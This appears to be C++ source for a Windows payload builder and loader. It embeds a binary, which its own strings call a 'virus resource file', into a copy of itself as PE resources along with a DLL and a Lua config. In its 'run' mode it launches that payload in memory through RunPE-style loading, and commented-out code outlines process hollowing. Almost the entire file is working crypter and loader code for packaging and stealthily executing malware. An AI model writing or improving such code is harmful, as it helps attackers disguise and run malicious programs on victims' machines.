#include "PEGenerator.h"

void CPEGenerator::ParseParams(int argc, wchar_t* argv[]) {
    if (argc <= 1) {
        WaitToRunVirus();
        // MemoryLoadToRun(IDR_BINARY_FILE);
        // MemoryLoadToRun(IDR_BINARY_FILE);
        //pRunPE(IDR_BINARY_FILE);
    }
    else if (argc == 2) {
        CString str_param = argv[1];
        if (str_param == L"run") {

            // MemoryLoadToRun(IDR_BINARY_FILE);
            MemLoadDll();

            int cnt = 10;
            int pid = -1;
            int config = ExtractLuaGetCfg(IDR_CFG);
            while (cnt-- && pid == -1) {
                if (config) {
                    pid = pRunPE(IDR_BINARY_FILE);
                }
                else {
                    ExtractAndRunResourceProgram(IDR_BINARY_FILE, str_temp_path, pid);
                }
                Sleep(1000);
            }


            SharedMemory share;
            share.WritePid(pid);



            //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
            //if (!hMainThread) {
            //    return;
            //}

            //// 创建辅助线程执行 Hollowing
            //HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
            //if (!hThread) {
            //    CloseHandle(hMainThread);
            //    return;
            //}

            //// 等待辅助线程完成
            //WaitForSingleObject(hThread, INFINITE);
            //CloseHandle(hThread);
            //CloseHandle(hMainThread);

        }
        else if (str_param == L"wait") {
            return;
        }

    }
    else if (argc >= 3) {

        CString str_param = argv[1];
        if (str_param == L"runlua") {
            char* str_file;
            WChar2Ansi(argv[2], str_file);
            if (str_file) {
                LuaRunner runner;
                runner.run_lua_file(str_file);
                delete[] str_file;
            }
            else {
                OutputDebugStringA("trans file data to char failed .");
            }
            return;
        }
        else if (str_param == L"addrec" && argc >= 5) {
            char* str_id = nullptr;
            WChar2Ansi(argv[4], str_id);
            int id = atoi(str_id);
            update_file(argv[2], argv[3], id);
            return;
        }

        WCHAR exePath[MAX_PATH];
        // 获取当前程序的路径
        DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
        LPCWSTR resourceFilePath = argv[1];
        LPCWSTR newExePath = argv[2];
        CString lua_path;
        int config = 0;
        if (argc >= 4) {
            lua_path = argv[3];
        }
        if (argc >= 5) {
            config = 1;
        }
#ifdef _WIN64
        AddFileToResource(exePath, resourceFilePath, newExePath, lua_path, config);
#else
        AddFileToResource32(exePath, resourceFilePath, newExePath, lua_path, config);
#endif
    }
}

// 用于资源更新
bool update_resource(CString str_path, HANDLE hUpdate, int rid) {

    bool flag = false;

    do {

        // 打开要添加到资源的文件 phdll
        std::ifstream phfile(str_path, std::ios::binary);
        if (!phfile.is_open()) {
            MessageBox(NULL, L"Failed to open the rc file.", str_path, MB_OK);
            break;
        }

        // 读取文件内容到内存 phdll
        phfile.seekg(0, std::ios::end);
        size_t phfileSize = phfile.tellg();
        phfile.seekg(0, std::ios::beg);

        char* buffer = new char[phfileSize];
        phfile.read(buffer, phfileSize);
        phfile.close();

        // 将文件内容更新到资源中 phdll
        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(rid), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
            MessageBox(NULL, L"Failed to update the rc to resource.", str_path, MB_OK);
            delete[] buffer;
            break;
        }

        delete[] buffer;
        flag = true;
    } while (0);
    return flag;
}

bool update_config(int config, HANDLE hUpdate, int rid)
{
    bool flag = false;
    do {
        CStringA str_lua;
        str_lua.Format(R"(
            function getcfg()
                return %d
            end
        )", config);

        // 将文件内容更新到资源中 phdll
        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(rid), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), str_lua.GetBuffer(), str_lua.GetLength())) {
            MessageBox(NULL, L"Failed to update the config lua to resource.", L"rc_config", MB_OK);
            str_lua.ReleaseBuffer();
            break;
        }
        str_lua.ReleaseBuffer();
        flag = true;
    } while (0);
    return flag;
}

// 添加文件及资源到新的可执行文件
BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path, int config) {
    WCHAR tempFilePath[MAX_PATH];
    wchar_t msg[512] = { 0 };

    // 创建临时文件路径
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // 将当前可执行文件复制到临时文件
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // 打开临时文件进行资源更新
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 打开要添加到资源的文件
    std::ifstream file(resourceFilePath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 读取文件内容到内存
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // 将文件内容更新到资源中
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    delete[] buffer;


    buffer = nullptr;

    // 打开要添加到资源的文件 phdll
    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
    if (!phfile.is_open()) {
        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 读取文件内容到内存 phdll
    phfile.seekg(0, std::ios::end);
    size_t phfileSize = phfile.tellg();
    phfile.seekg(0, std::ios::beg);

    buffer = new char[phfileSize];
    phfile.read(buffer, phfileSize);
    phfile.close();

    // 将文件内容更新到资源中 phdll
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    delete[] buffer;

    if (!lua_path.IsEmpty()) {
        if (!update_resource(lua_path, hUpdate, IDR_LUA)) {
            EndUpdateResource(hUpdate, TRUE);
            DeleteFile(tempFilePath); // 删除临时文件
            return FALSE;
        }
    }

    update_config(config, hUpdate, IDR_CFG);

    do {
        // 加载要复制资源的文件
        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
        if (!hResourceModule) {
            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
            break;
        }

        // 遍历并更新 resourceFilePath 中的所有资源到新的可执行文件
        ResourceUpdateData updateData = { hUpdate };
        if (!EnumResourceTypes(hResourceModule, EnumTypesProc, (LONG_PTR)&updateData)) {
            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
            FreeLibrary(hResourceModule);
            break;
        }

        // 释放资源模块
        FreeLibrary(hResourceModule);
    } while (0);
    // 完成资源更新
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        return FALSE;
    }

    // 将修改后的临时文件复制到目标文件路径
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 删除临时文件
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc, lParam);
}

bool update_file(CString src_path, CString dst_path, int rid)
{
    // 打开临时文件进行资源更新
    HANDLE hUpdate = BeginUpdateResource(src_path, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(src_path); // 删除临时文件
        return FALSE;
    }
    update_resource(dst_path, hUpdate, rid);

    // 完成资源更新
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        return FALSE;
    }

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc, lParam);
}

BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData* updateData = (ResourceUpdateData*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

// 添加文件及资源到新的可执行文件
BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path, int config) {
    WCHAR tempFilePath[MAX_PATH];
    char msg[512] = { 0 };

    // 创建临时文件路径
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // 将当前可执行文件复制到临时文件
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // 打开临时文件进行资源更新
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }
    // 打开要添加到资源的文件
    std::ifstream file(resourceFilePath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 读取文件内容到内存
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // 将文件内容更新到资源中
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    delete[] buffer;
    buffer = nullptr;

    // 打开要添加到资源的文件 phdll
    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
    if (!phfile.is_open()) {
        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 读取文件内容到内存 phdll
    phfile.seekg(0, std::ios::end);
    size_t phfileSize = phfile.tellg();
    phfile.seekg(0, std::ios::beg);

    buffer = new char[phfileSize];
    phfile.read(buffer, phfileSize);
    phfile.close();

    // 将文件内容更新到资源中 phdll
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    delete[] buffer;

    if (!lua_path.IsEmpty()) {
        if (!update_resource(lua_path, hUpdate, IDR_LUA)) {
            EndUpdateResource(hUpdate, TRUE);
            DeleteFile(tempFilePath); // 删除临时文件
            return FALSE;
        }
    }

    update_config(config, hUpdate, IDR_CFG);

    do {

        // 加载资源文件
        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
        if (!hResourceModule) {
            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
            break;
        }

        // 遍历并更新 resourceFilePath 中的所有资源到新的可执行文件
        ResourceUpdateData32 updateData = { hUpdate };
        if (!EnumResourceTypes(hResourceModule, EnumTypesProc32, (LONG_PTR)&updateData)) {
            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
            FreeLibrary(hResourceModule);
            break;
        }

        // 释放资源模块
        FreeLibrary(hResourceModule);
    } while (0);

    // 完成资源更新
    if (!EndUpdateResource(hUpdate, FALSE)) {
        sprintf_s(msg, "Failed to finalize resource update. errcode : %d .", GetLastError());
        MessageBoxA(NULL, msg, "generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 将修改后的临时文件复制到目标文件路径
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 删除临时文件
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

// 枚举资源类型
BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc32, lParam);
}

// 枚举资源名称
BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc32, lParam);
}

// 枚举资源语言并更新资源
BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData32* updateData = (ResourceUpdateData32*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

//// 用于 Process Hollowing 的辅助线程函数
//DWORD WINAPI HollowingThread(LPVOID lpParam) {
//    HANDLE hMainThread = (HANDLE)lpParam;
//
//    // 暂停主线程
//    if (SuspendThread(hMainThread) == -1) {
//        return 1;
//    }
//
//    RunPE();
//
//
//}
